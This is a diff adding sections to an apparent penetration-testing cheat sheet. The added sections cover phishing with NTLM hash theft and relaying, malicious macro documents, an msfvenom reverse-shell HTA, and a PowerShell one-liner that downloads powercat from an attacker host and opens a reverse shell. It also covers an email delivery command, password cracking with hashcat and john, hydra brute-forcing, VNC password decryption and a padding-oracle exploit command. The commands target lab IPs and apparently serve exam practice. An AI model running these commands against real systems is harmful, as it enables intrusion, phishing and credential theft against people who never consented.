@@ -3570,6 +3570,43 @@ Library files consist of three major parts written in XML to specify the paramet
 5. Start the Python3 web server on port `8000` to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
 6. Send the library file to the victim and wait for them to execute the shortcut file to get a reverse shell
 
+### <ins>Phishing</ins>
+
+- Leverage ports 110 and 25
+- https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish
+**ODT**: https://www.exploit-db.com/exploits/44564
+- `python2 /usr/share/exploitdb/exploits/windows/local/44564.py`
+- `sudo responder -I tun0 -v`
+- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`
+
+**NTLM theft**
+- https://github.com/Greenwolf/ntlm_theft
+- `python3 ntlm_theft.py -g all -s 192.168.45.201 -f test`
+- `sudo responder -I tun0 -v`
+- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`
+
+**Redirecting NTLMv2**
+- `python2 44564.py`
+- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
+- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.226.169 -c "powershell -e base64"`
+  - only possible if there is an smb on the target
+
+**Upload a lmk link that redirects to the following**
+- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213/powercat.ps1');powercat -c 192.168.45.213 -p 8039 -e powershell"`
+
+**Macro**
+- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
+- `python 4_doc_macro.py BASE64`
+- create doc with macros and Libreoffice
+  - Tools > Macro
+  - Tools > Customize > Events > Open Document
+- Spreadsheet > This also runs macros
+- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.154 LPORT=443 -f hta-psh -o evil.hta`
+  - another way to create macros, then cat the file to copy it
+
+**Send an email**
+- `sudo swaks -t <recipient> -t <recipient> --from <sender> --attach @<Windows-Library-file> --server <IP> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
+- use WebDAV
 
 ## Thick client vulnerabilities
 
@@ -3913,6 +3950,12 @@ find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null
 - [Scavenger](https://github.com/0xDexter0us/Scavenger)
 - [cewl](https://digi.ninja/projects/cewl.php)
   - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
+- Wordlists in kali
+  - /usr/share/wordlists/seclists/Passwords/months.txt
+  - /usr/share/wordlists/seclists/Passwords/seasons.txt
+  - /usr/share/wordlists/metasploit/unix_passwords.txt
+  - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+  - /usr/share/wordlists/rockyou.txt
 
 **Brute Force Wordlists**
 
@@ -3951,6 +3994,17 @@ Other rules
 - `/usr/share/hashcat/rules` in Kali
 - See: [rule_based_attack [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
 
+#### Password Decrypts
+- https://github.com/frizb/PasswordDecrypts
+- ```
+  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+  msf5 > irb
+  key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
+  require 'rex/proto/rfb'
+  Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
+  ```
+- `aes_decrypt.py`
+  - you need the key + iv to decrypt an encoded base64
 
 #### <ins>Password Cracking</ins>
 
@@ -3960,6 +4014,7 @@ Other rules
 - [Ophcrack](https://ophcrack.sourceforge.io/)
 
 #### John the Ripper
+- `john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash`
 - Note for Linux-based systems: first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
 - `john -incremental -users:<user list> <file to crack>` pure brute force attack, you can use `-user:<username>` to target a specific user
 - `john --show crackme` display the passwords recovered
@@ -3970,6 +4025,15 @@ Other rules
 - To distribute the load and speed up the cracking process (for multi core CPUs)
   1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
   2. Use the options `--fork=8` and `--node=9-16/16` on the first machine
+
+#### Hashcat
+
+- `hashcat --help | grep -i "sha-256"`
+- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+- `hashcat -m 24200 user.hash /usr/share/wordlists/rockyou.txt --force`
+- `hashcat -m 10900 'pbkdf2_sha256$216000$8Dawv0l1PGBR$n/Jnp5J0RM++B/vjWFp3R/jRzFaxGLxK9KGgwTuvX3M=' /usr/share/wordlists/rockyou.txt --force`
+- https://systemweakness.com/cracking-user-passwords-stored-in-keycloak-with-hashcat-d56522cc2dc
+
 
 #### Ophcrack
 
@@ -4037,6 +4101,10 @@ Other rules
   - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
   - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
   - Specify a port with `-s <PORT>` in <options>
+- `hydra -L usernames.txt -P passwords.txt 192.168.244.140 smtp -e nsr`
+- `hydra -L usernames.txt -P usernames.txt 192.168.182.216 ssh -e nsr`
+- `sudo hydra -L usernames.txt -P passwords.txt 192.168.157.21 smb2 -e nsr`
+- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.190.208:7080/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`
 
 SSH Attack
 - `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
@@ -4053,6 +4121,33 @@ HTTP POST Attack
   - `-f` stop the attack when the first successful result is found
   - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`
 
+#### Password protected files
+- dfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
+- rar2john backup.rar > crackme
+  - john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+  - same for zip2john
+- ssh2john id_rsa > ssh.hash
+  john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+- office2john RSA-Secured-Document-PII.docx > hash.txt
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+- keepass2john jeeves.kdbx > jeeves.hash
+  john jeeves.hash
+- fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup1.zip
+
+#### Custom wordlists
+- Cewl
+  - (at first, use just this list) `cewl http://192.168.134.126/ --with-numbers -w custom-wordlist.txt`
+  - `cewl -d 5 -m 3 http://192.168.220.115/ -w custom-wordlist.txt`
+  - `cewl --lowercase http://192.168.13444.126/ | grep -v CeWL >> custom-wordlist.txt`
+  - `sort custom-wordlist.txt | uniq -u > final-wordlist.txt`
+- generate usernames
+  - `python2 ~/Documents/scripts/usernamer.py -f full_names.txt`
+- `cupp -i`
+
+#### More attacks
+- `crackmapexec ssh 192.168.220.240 -u usernames.txt -p passwords.txt --continue-on-success`
+- AES-256-CBC-PKCS7: https://github.com/mpgn/Padding-oracle-attack
+  - `python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.229.119:2290 -u '/?c=' --error '<span id="MyLabel">0</span>'`
 
 #### <ins>Leveraging Password Hashes</ins>
 
